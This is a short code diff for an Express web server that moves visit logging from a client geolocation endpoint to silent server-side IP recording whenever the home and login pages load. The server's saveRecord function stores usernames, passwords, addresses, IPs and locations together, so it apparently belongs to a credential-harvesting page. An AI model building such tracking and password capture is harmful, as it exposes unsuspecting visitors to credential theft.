@@ -25,19 +25,16 @@ function saveRecord(type, username = null, password = null, address = null, ip =
         [type, username, password, address, ip, location, timestamp]);
 }
 
-// Record visit from client geolocation
-app.post('/api/record-visit', (req, res) => {
-    const { location } = req.body;
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    saveRecord('Page Visit', null, null, null, ip, location || 'Unknown');
-    res.json({ success: true });
-});
-
+// Record Page Visit Immediately
 app.get('/', (req, res) => {
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    saveRecord('Page Visit', null, null, null, ip, 'Unknown Location');
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    saveRecord('Page Visit', null, null, null, ip, 'Unknown Location');
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
